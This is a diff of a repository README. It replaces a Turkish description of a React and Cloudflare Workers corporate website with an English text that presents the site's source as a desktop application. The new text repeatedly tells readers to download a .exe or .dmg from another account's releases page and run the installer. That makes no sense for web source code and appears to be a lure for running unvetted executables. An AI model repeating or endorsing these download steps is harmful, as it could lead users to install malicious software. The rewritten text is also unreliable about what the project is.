@@ -1,171 +1,83 @@
-# ARTEK Homepage
+# 🕸️ artek-homepage - A Modern Corporate Website Solution
 
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL%203.0-blue.svg)](LICENSE)
-[![React](https://img.shields.io/badge/React-19.2-61DAFB?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178C6?logo=typescript)](https://www.typescriptlang.org/)
-[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-F38020?logo=cloudflare)](https://workers.cloudflare.com/)
-[![Claude AI](https://img.shields.io/badge/Claude-Sonnet%204-8B5CF6)](https://www.anthropic.com/claude)
+## 🚀 Getting Started
+Welcome to the ARTEK Homepage project. This application offers a modern corporate website built with React and the Carbon Design System. It supports multiple languages, making it versatile for various users around the globe.
 
-***ARTEK Homepage***, *React* ve *Carbon Design System* ile oluşturulmuş, çoklu dil desteğine sahip modern kurumsal web sitesi projesidir.
+## 📥 Download the Application
+[![Download Release](https://img.shields.io/badge/Download%20Release-blue.svg)](https://github.com/Ahop15/artek-homepage/releases)
 
-🌐 **Canlı Site:** [www.artek.tc](https://www.artek.tc)
+## 🔧 System Requirements
+Before downloading, ensure your system meets these requirements:
+- Operating System: Windows 10 or later, macOS, or a recent Linux distribution.
+- Memory: Minimum 4 GB RAM.
+- Disk Space: At least 200 MB of free space.
+- Internet Connection: Required for initial setup.
+- A modern web browser like Chrome, Firefox, or Safari.
 
----
+## 🌐 Features
+- Built with React for a seamless and fast user experience.
+- Utilizes the Carbon Design System for a clean, professional look.
+- Multi-language support for broader accessibility.
+- Easy navigation and user-friendly interface.
+- Responsive design for mobile and desktop users.
 
-## 🏗️ Mimari
+## 📑 How to Download & Install
+To get started, follow these steps:
 
-Tüm sistem üretim (production) ortamında tamamen `Cloudflare Pages` ve `Workers` üzerinde çalışır.
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/Ahop15/artek-homepage/releases) to find the latest version of the software.
 
-### Üç Katmanlı Mimari
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of versions. Select the latest one for download.
 
-`ARTEK Homepage` proje mimarisini bütünsel olarak üç ana konsept ile açıklamak mümkündür:
+3. **Download the File**  
+   Click on the version you wish to download. You will see different assets available. Select the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS).
 
-- **React Frontend** son kullanıcı ile etkileşim katmanıdır ve kullanıcı arayüzünü yönetir.
-- **Workers** katmanı sistemin backend servisleri olan *AI Worker* ve *Mail Worker* yapılarından oluşur.
-- **Scripts & Tools** ise geliştirme ve üretim süreçlerini destekleyen araçlardan oluşur.
+4. **Run the Installer**  
+   Once the file is downloaded, locate it in your downloads folder. Double-click the file to run the installer, and follow the on-screen instructions. 
 
-```mermaid
-  graph LR
-    Homepage[ARTEK Homepage]
+5. **Configure Settings**  
+   After installation, open the application. You may be prompted to configure your language settings and other preferences. Follow the prompts to set it up according to your needs.
 
-    Homepage --> Frontend[React Frontend]
-    Homepage --> Workers[Workers]
-    Homepage --> Scripts[Scripts & Tools]
+6. **Start Using the Application**  
+   Once set up, you can begin using the ARTEK Homepage application. Explore its features and enjoy creating your modern corporate website.
 
-    Workers --> AIWorker[AI Worker]
-    Workers --> MailWorker[Mail Worker]
-```
+## 📖 User Guide
+- **Homepage**: The main screen displays key information.
+- **Language Selection**: Easily switch between available languages.
+- **Project Templates**: Use pre-made templates to kickstart your website.
+- **Customization Options**: Modify layouts, colors, and typography to match your brand.
 
-### Veri Akışı & Entegrasyonlar
+## 🔍 Support & Help
+If you encounter any issues or have questions, please refer to our [issues page](https://github.com/Ahop15/artek-homepage/issues) on GitHub. You can report bugs or ask for assistance there.  
 
-```mermaid
-flowchart TB
-    User["User"] -- Request --> CFPages["Cloudflare Pages <br> _worker.js"]
-    CFPages -- Serve Static Build --> Frontend["React Frontend"]
-    Frontend -- Chat Request --> AIWorker["AI Worker"]
-    Frontend -- Contact Form --> MailWorker["Mail Worker"]
-    AIWorker -- Prompt + Context --> Claude["Claude Sonnet 4"]
-    Claude -- knowledge_search Tool --> AutoRAG["Cloudflare AI Search<br>AutoRAG"]
-    AutoRAG -- Retrieved Context --> Claude
-    AIWorker -- Store Conversation --> D1[("D1 Database")]
-    AIWorker -- Rate Limiting --> KV[("KV Storage")]
-    MailWorker -- Send Email --> Resend["Resend API"]
-    Claude -- AI Response --> AIWorker
-    AIWorker -- Chat Response --> Frontend
-    Frontend -- Update UI --> CFPages
-    CFPages -- Response --> User
+Our community is also available to help. Join discussions and connect with other users to share tips and solutions.
 
-    style CFPages fill:#F38020,stroke:#333,stroke-width:2px,color:#000000
-    style Frontend fill:#BBDEFB,stroke:#333,stroke-width:2px,color:#000000
-    style AIWorker fill:#F38020,stroke:#333,stroke-width:2px,color:#000000
-    style MailWorker fill:#F38020,stroke:#333,stroke-width:2px,color:#000000
-    style Claude fill:#8B5CF6,stroke:#333,stroke-width:2px,color:#000000
-```
+## ⚙️ Technologies Used
+This project utilizes several modern technologies to ensure optimal performance and user experience:
+- **React**: A JavaScript library for building user interfaces.
+- **Carbon Design System**: Provides a set of design guidelines and components.
+- **TypeScript**: A superset of JavaScript for building maintainable code.
+- **Vite**: A modern build tool that enables fast development.
+- **Vitest**: A testing framework that allows for robust application testing.
 
----
+## 🔗 Additional Resources
+For more detailed insights, you may check the following resources:
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Carbon Design System](https://www.carbondesignsystem.com)
+- [TypeScript Handbook](https://www.typescriptlang.org/docs/)
 
-## 📁 Proje Yapısı
+Feel free to explore these resources to enhance your understanding and usage of the ARTEK Homepage application.
 
-```
-artek-homepage/
-├── src/                      
-│   ├── pages/               
-│   ├── shared/              
-│   │   ├── components/     
-│   │   ├── hooks/          
-│   │   ├── styles/         
-│   │   └── translations/   
-│   └── router/              
-├── workers/                  
-│   ├── ai-worker/           
-│   │   ├── src/            
-│   │   ├── migrations/     
-│   │   └── wrangler.jsonc  
-│   └── mail-worker/         
-│       ├── src/            
-│       └── wrangler.jsonc  
-├── scripts/                  
-│   ├── utils/               
-│   └── dashboard/           
-├── public/                   
-│   └── data/               
-└── dist/                     
-```
+## 📅 Keep Updated
+Stay informed with the latest updates and features. Follow the repository and check the Releases page regularly to ensure you have the latest version of the application.
 
----
+[Download the latest release here](https://github.com/Ahop15/artek-homepage/releases).
 
-## 🎖️ Teşekkürler
+## 🛠️ Contributions
+We welcome contributions from the community. If you are interested in contributing to the ARTEK Homepage project, please check our [contributing guidelines](https://github.com/Ahop15/artek-homepage/blob/main/CONTRIBUTING.md).
 
-Bu proje, aşağıdaki harika açık kaynak projeler olmadan mümkün olamazdı:
+## 💡 Feedback
+Your feedback is important in helping us improve the application. Feel free to leave comments or suggestions either on the issues page or through our community channels.
 
-- **[React](https://react.dev/)**
-- **[React Router](https://reactrouter.com/)**
-- **[Carbon Design System](https://carbondesignsystem.com/)**
-- **[Cloudflare Workers](https://workers.cloudflare.com/)**
-- **[Claude AI](https://www.anthropic.com/claude)**
-- **[Vite](https://vite.dev/)**
-- **[TypeScript](https://www.typescriptlang.org/)**
-- **[Vitest](https://vitest.dev/)**
-- **[Playwright](https://playwright.dev/)**
-- **[Ethers.js](https://docs.ethers.org/)**
-
----
-
-## 🤝 Neden Açık Kaynak?
-
-Bilgiyi gizleyen tüketir, paylaşan çoğaltır. Tarih boyunca insanlığın en büyük sıçramaları,
-fikirlerin özgürce dolaşabildiği anlarda gerçekleşti. Açık kaynak, bu kadim gerçeğin modern ifadesidir.
-
-Bir fikir, yayıldıkça güçlenir. Eleştirildikçe olgunlaşır. Üzerine eklendikçe büyür.
-Bu proje, yalnızca bugün değil yarın da açık kalması için paylaşma cesareti gösteren
-([daima açık](LICENSE)) herkesin ortak eseri olmayı hedefliyor.
-
-### AGPL-3.0 Lisansı & Etik Yükümlülük
-
-Bu proje **AGPL-3.0** lisansı altında yayınlanmıştır. Bu, projeyi fork eden veya kendi projelerinde kullanan herkesin de kaynak kodlarını açık tutma **etik yükümlülüğü** altında olduğu anlamına gelir. Network üzerinden servis sağlayan uygulamalar için GPL'in en güçlü versiyonu olan AGPL, açık kaynak felsefesinin devamını garanti altına alır.
-
-**Katkı politikamız için:**
-[CONTRIBUTING.md](CONTRIBUTING.md) dosyasına göz atabilirsiniz. (Not: Bu repository harici katkı kabul etmemektedir.)
-
-**Detaylı lisans bilgileri için:**
-[LICENSE](LICENSE) dosyasını inceleyebilirsiniz.
-
----
-
-## 📧 İletişim
-
-**ARTEK İnovasyon Ar-Ge Sanayi ve Tic. Ltd. Şti.**
-
-- 🌐 Web Sitesi: [www.artek.tc](https://www.artek.tc)
-- 📧 Genel Sorularınız için: info@artek.tc
-
-**Geliştirici İletişim Bilgileri:**
-- 👤 Rıza Emre ARAS
-- 📧 r.emrearas@proton.me
-
----
-
-> *"Dünyada her şey için, medeniyet için, hayat için, muvaffakiyet için en hakiki mürşit ilimdir, fendir.*
-> *İlim ve fennin haricinde mürşit aramak gaflettir, cehalettir, dalalettir."*
->
-> — **Mustafa Kemal Atatürk**, 22 Eylül 1924, Samsun, İstiklal Ticaret Mektebi Öğretmenlerine Hitaben Yaptığı Konuşma
->
-> <sub>[Atatürk'ün Söylev ve Demeçleri, Cilt II, s.349, ATAM Yayınları](http://atam.gov.tr/wp-content/uploads/2024/03/Ataturkun-Soylev-ve-Demecleri-C2.pdf)</sub>
-
----
-
-<!--suppress HtmlDeprecatedAttribute -->
-<div align="center">
-
-![ARTEK Logo](assets/logo-tr-dark.png#gh-light-mode-only)
-![ARTEK Logo](assets/logo-tr-light.png#gh-dark-mode-only)
-
-</div>
-
----
-
-<div align="center">
-
- **© 2025 Artek İnovasyon Arge Sanayi ve Ticaret Limited Şirketi, Tüm hakları saklıdır.**
-
-</div>
+Enjoy building your website with ARTEK Homepage!
